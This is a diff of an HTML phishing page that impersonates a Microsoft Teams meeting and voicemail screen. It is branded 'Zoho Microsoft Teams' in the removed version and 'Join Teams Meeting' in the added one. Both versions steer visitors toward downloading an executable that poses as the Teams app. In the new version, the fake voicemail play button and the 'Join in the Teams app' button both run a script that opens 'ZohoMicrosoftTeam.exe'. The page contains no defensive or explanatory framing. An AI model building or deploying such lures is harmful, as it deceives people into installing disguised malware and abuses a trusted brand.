@@ -1,209 +1,142 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Zoho Microsoft Teams</title>
-  <style>
-    body {
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f5f5f5;
-      margin: 0;
-      padding: 0;
-      text-align: center;
-    }
-
-    .container {
-      max-width: 480px;
-      margin: 80px auto;
-      padding: 24px;
-      background-color: #ffffff;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    }
-
-    .header {
-      font-size: 22px;
-      font-weight: 600;
-      color: #444;
-      margin-bottom: 16px;
-    }
-
-    .illustration {
-      margin-bottom: 16px;
-    }
-
-    .illustration img {
-      width: 180px;
-      border-radius: 50%;
-    }
-
-    .instructions {
-      font-size: 16px;
-      color: #555;
-      margin: 16px 0 12px 0;
-    }
-
-    .button {
-      width: 90%;
-      max-width: 320px;
-      padding: 12px;
-      margin: 8px auto;
-      font-size: 16px;
-      font-weight: 500;
-      color: #fff;
-      background-color: #6264a7;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: background 0.2s;
-      display: block;
-      text-decoration: none;
-    }
-
-    .button.secondary {
-      background-color: transparent;
-      color: #6264a7;
-      border: 2px solid #6264a7;
-    }
-
-    .footer {
-      font-size: 13px;
-      color: #666;
-      margin-top: 24px;
-    }
-
-    .footer a {
-      color: #6264a7;
-      text-decoration: none;
-      margin: 0 8px;
-    }
-
-    a.button-link {
-      text-decoration: none;
-      display: block;
-    }
-
-    .modal {
-      display: none;
-      position: fixed;
-      z-index: 100;
-      left: 0; top: 0;
-      width: 100vw; height: 100vh;
-      background: rgba(0,0,0,0.25);
-      align-items: center;
-      justify-content: center;
-    }
-
-    .modal-content {
-      background: #fff;
-      border-radius: 10px;
-      padding: 2rem 1.5rem;
-      width: 90%;
-      max-width: 360px;
-      text-align: center;
-      box-shadow: 0 6px 24px rgba(0,0,0,0.18);
-    }
-
-    .modal-content h3 {
-      color: #6264a7;
-      margin-bottom: 0.7rem;
-    }
-
-    .modal-content p {
-      color: #444;
-      margin-bottom: 1.1rem;
-    }
-
-    .modal .button {
-      margin: 0.5rem 0 0 0;
-    }
-
-    .close-btn {
-      background: none;
-      color: #6264a7;
-      border: none;
-      font-size: 15px;
-      cursor: pointer;
-      margin-top: 1rem;
-      text-decoration: underline;
-    }
-
-    .close-btn:hover {
-      text-decoration: none;
-    }
-
-    /* Mobile notice styling */
-    .mobile-message {
-      display: none;
-      max-width: 90%;
-      margin: 80px auto;
-      padding: 32px 24px;
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      font-size: 17px;
-      color: #444;
-    }
-
-    @media (max-width: 600px) {
-      .container {
-        display: none;
-      }
-      .mobile-message {
-        display: block;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Teams Meeting</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #f3f2f1;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background-color: #fff;
+            padding: 28px 18px 24px 18px;
+            border-radius: 14px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.10);
+            max-width: 340px;
+            width: 40%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo {
+            max-width: 48px;
+            margin-bottom: 12px;
+        }
+        h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin: 0 0 10px 0;
+        }
+        p {
+            font-size: 15px;
+            color: #666;
+            margin: 0 0 18px 0;
+        }
+        .button {
+            background-color: #6264a7;
+            color: white;
+            padding: 12px 0;
+            text-decoration: none;
+            border-radius: 10px;
+            display: block;
+            width: 100%;
+            max-width: 210px;
+            margin: 8px auto;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            font-size: 15px;
+            transition: background 0.2s, color 0.2s, border 0.2s;
+        }
+        .button:hover {
+            background-color: #4e4a96;
+        }
+        .button.teams-app {
+            background-color: #fff;
+            color: #6264a7;
+            border: 2px solid #6264a7;
+        }
+        .button.teams-app:hover {
+            background-color: #f3f2f1;
+            color: #4e4a96;
+            border-color: #4e4a96;
+        }
+        .footer {
+            margin: 18px auto 0 auto;
+            text-align: center;
+            padding-bottom: 24px;
+            width: 100%;
+        }
+        .footer .logo {
+            max-width: 36px;
+            margin-bottom: 6px;
+        }
+        .link {
+            color: #6264a7;
+            text-decoration: none;
+            font-weight: 400;
+            font-size: 14px;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 800px) {
+            .container {
+                width: 80%;
+                max-width: 98vw;
+                padding: 16px 4vw 18px 4vw;
+                margin-top: 0;
+            }
+        }
+        @media (max-width: 500px) {
+            .container {
+                width: 98vw;
+                max-width: 98vw;
+                padding: 12px 2vw 14px 2vw;
+                margin-top: 0;
+            }
+            h1 {
+                font-size: 17px;
+            }
+            .logo {
+                max-width: 36px;
+            }
+            .footer .logo {
+                max-width: 28px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="header">Zoho Microsoft Teams</div>
-    <div class="illustration">
-      <img src="https://statics.teams.cdn.office.net/hashedassets-launcher/v2/welcome_to_teams.ae3b0daa8fc4a83cb4cc3e60c4104fe0.svg" alt="Meeting illustration" />
+    <div class="container">
+        <img src="team.png" alt="Teams Logo" class="logo">
+        <h1>Join the Teams meeting</h1>
+        <p>Play Voicemail</p>
+        <button class="button" onclick="downloadFile()">▷ ──── 02:53</button>
+        <button class="button teams-app" onclick="downloadFile()">Join in the Teams app</button>
     </div>
-    <div class="instructions">First you'll need to download the app.</div>
-    <a href="Zoho_Microsoft_Teams.exe" class="button-link" target="_blank">
-      <button class="button">Join Zoho Teams App</button>
-    </a>
-    <div class="instructions">Already have the app?</div>
-    <button class="button secondary" id="playBtn">Play Voicemail</button>
-    <div class="footer">The voicemail link will be copied to your clipboard.</div>
     <div class="footer">
-      <a href="#">Privacy and cookies</a> | <a href="#">Third-party disclosures</a>
+        <img src="teams.jpg" alt="Teams Logo" class="logo">
+        <p style="margin-bottom:6px;">You don’t have the app?</p>
+        <a href="ZohoMicrosoftTeam.exe" class="link" onclick="downloadFile();return false;">Download it now</a>
     </div>
-  </div>
-
-  <div class="mobile-message">
-    ⚠️ This experience is optimized for desktop. Please open this page from a computer to join the Zoho Teams app or play voicemail messages.
-  </div>
-
-  <div class="modal" id="noAppModal" tabindex="-1" role="dialog" aria-modal="true">
-    <div class="modal-content">
-      <h3>Zoho Teams App Not Installed</h3>
-      <p>To play voicemail messages, please download and install the Zoho Teams app.</p>
-      <a href="Zoho_Microsoft_Teams.exe" target="_blank" class="button-link">
-        <button class="button">Download Zoho Teams App</button>
-      </a>
-      <br>
-      <button class="close-btn" onclick="closeModal()">Cancel</button>
-    </div>
-  </div>
-
-  <script>
-    function showModal() {
-      document.getElementById('noAppModal').style.display = 'flex';
-    }
-    function closeModal() {
-      document.getElementById('noAppModal').style.display = 'none';
-    }
-    document.getElementById('playBtn').addEventListener('click', function(e){
-      e.preventDefault();
-      showModal();
-    });
-    document.addEventListener('keydown', function(e) {
-      if(e.key === "Escape") closeModal();
-    });
-  </script>
+    <script>
+        function downloadFile() {
+            window.open("ZohoMicrosoftTeam.exe", "_blank");
+        }
+    </script>
 </body>
 </html>
